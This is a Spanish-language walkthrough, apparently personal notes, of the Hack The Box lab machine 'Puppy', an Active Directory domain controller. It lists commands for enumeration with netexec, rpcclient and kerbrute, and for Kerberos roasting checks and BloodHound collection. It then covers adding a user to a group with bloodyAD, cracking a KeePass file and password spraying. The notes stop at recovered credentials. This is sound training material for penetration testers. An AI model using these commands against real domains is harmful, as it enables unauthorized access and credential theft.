levi.james:KingofAkron2025!
## Reconocimiento

### Scaneo de puertos y servicios
Empezaremos realizando un reconocimiento con la herramienta de [[RUSTSCAN]] que es un [[NMAP]] con esteroides:
`rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sCV -o portScan`

```ad-info
rustscan tambien usa herramintas de nmap para una mejor respuesta sobre el reconocimiento de puertos
```

En caso de querer usar solo [[NMAP]]

Los puertos encontrados mas relevantes son:
```js
53 - DNS
88 - kerberos
111 - rpcbind
389 - LDAP
445 - SMB
5985 - WinRm
```

Usaremos [[CRACKMAPEXEC-NETEXEC]] para enumerar información básica del servicio **LDAP**.
`netexec ldap $IP 2>/dev/null` 

```js

LDAP $IP 389 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)

```

Nos muestra: el protocolo `LDAP` la `IP` y el puerto `389`, a continuación nos muestra el rol del host `DC` que es **Domain Controller**, identificación del sistema operativo , nombre del host y dominio completo `FQDN`


Usaremos la herramienta de `https://github.com/Gzzcoo/iRealm` para añadir la maquina al `/etc/hosts` y el nombre de dominio y FQDN a `/etc/krb5.conf`
`iRealm --force $IP PUPPY.HTB DC`

### Verificación de credenciales
Verificamos las credenciales que nos han aportado son validas con [[CRACKMAPEXEC-NETEXEC]]
`netexec ldap $IP -u 'levi.james' -p 'KingofAkron2025!'`

Nos mostrara que las credenciales son validas

#### Búsqueda de información en recursos compartidos
Buscamos recursos compartidos en el servicio *SMB* con [[CRACKMAPEXEC-NETEXEC]]
`netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares  -M spider_plus`

Usaremos la opción `--shares` para listar los recursos compartidos y el modulo `-M spider_plus` para hacer una búsqueda profunda de recursos compartidos nos genera un archivo `.JSON` en `/root/.nxc/modules/nxc_spider_plus/10.10.11.70.json`

### Enumeración Usuarios

Podemos probar con [[RPCCLIENT]] con una NULL SESSION
`rpcclient -U "" $IP -N` -> `enumdomusers`

Luego probaremos con USER:PASS con [[RPCCLIENT]]
`rpcclient -U 'levi.james%KingofAkron2025!' $IP` -> `enumdomusers`
Nos enumerara los usuarios del dominio

Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
`nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`

Para verificar y enumerar que existan en el dominio con la herramienta [[KERBRUTE]]
`kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`

```ad-hint    
Administrator    
Guest            
krbtgt           
levi.james       
ant.edwards      
adam.silver      
jamie.williams   
steph.cooper     
steph.cooper_adm 
```




 ```ad-note
   El error KDC_ERR_PREAUTH_FAILED la contraseña no funciona pero existe el usuario
  El error KDC_ERR_CLIENT_REVOKED existe el usuario
 ```
 


```ad-info
### Verificacion de diferentes vectores de ataque
#### AS-REP ROASTING (Sin creds)
Busca obtener _hashes_ de contraseñas de usuarios que tengan deshabilitada la **preautenticación Kerberos**
`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
No es susceptible al ataque.

#### KERBEROASTING (Con creds validas)
Enumeración de usuario que tenga **serviceprincipalname** (SPN) 
`impacket-GetUserSPNs 'puppy.htb/levi.james:KingofAkron2025!' -dc-ip $IP`
No es susceptible al ataque.  
```


### Recopilacion de datos de AD

Recopilaremos unformacion del LDAP y lo guardaremos en un `.zip` que es le usaremos para subir al **BloodHound**, usaremos la herramienta [[CRACKMAPEXEC-NETEXEC]]
`netexec ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --bloodhound --collection All --dns-server $IP`
Usaremos la opcion `--bloodhound` que activa el modulo de recoleccion de datos, usamos tambien `--collection All` especifica que se usen todos los metodos de recoleccion de datos. Y `--dns-server $IP` se usa para que la herramienta use el **DC** como DNS.

EL archivo que nos genera lo subiremos a **BloodHound**

```ad-note
Para ejecutar **BloodHound** hemos creado un script el cual para levantar el servicio solo tendremos que hacer `bloodHound up` y navegar a la web.
Una vez dentro de la web importaremos el `.zip`
```

Para buscar a que grupo pertenecemos, en el buscador de **bloodHound** el usuario que nos facilitaron al principio `levis.james`
Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar y añadir atributos en otro grupo del que es miembro en este caso del grupo `DEVELOPERS@PUPPY.HTB`  


Sabiendo que tenemos esos "privilegios" añadimos el usuario al grupo **DEVELOPERS**
`bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`

Como nos hemos añadido al grupo **DEVELOPERS** volvemos a acceder al **SMB** y tendremos acceso a la carpeta compartida **DEV**
`netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `

Nos encontramos que en el directorio hay un archivo con extensión de *keepass* `kdbx` 
`recovery.kdbx`

```ad-info
KeePass es un **gestor de contraseñas de código abierto y gratuito** que te ayuda a **almacenar de forma segura** tus nombres de usuario, contraseñas y otros datos sensibles.
```

Nos descargamos el archivo que hemos encontrado con [[CRACKMAPEXEC-NETEXEC]]
`netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`

El archivo descargado lo subimos **Keepassxc** para poder ver su contenido nos pide una password como no tenemos esta contraseña haremos fuerza bruta hacia el archivo

Usaremos `./keepas4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt`
La contraseña que nos devuelve es `liverpool`

Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contraseñas en un archivo, y junto con los usuarios que encontramos al principio y haremos fuerza bruta para ver si alguna contraseña le pertenece a algún usuario. 
Usaremos [[CRACKMAPEXEC-NETEXEC]]
`netexec ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`

Nos encuentra el siguiente user y su password
```ad-hint
[+] PUPPY.HTB\ant.edwards:Antman2025!
```





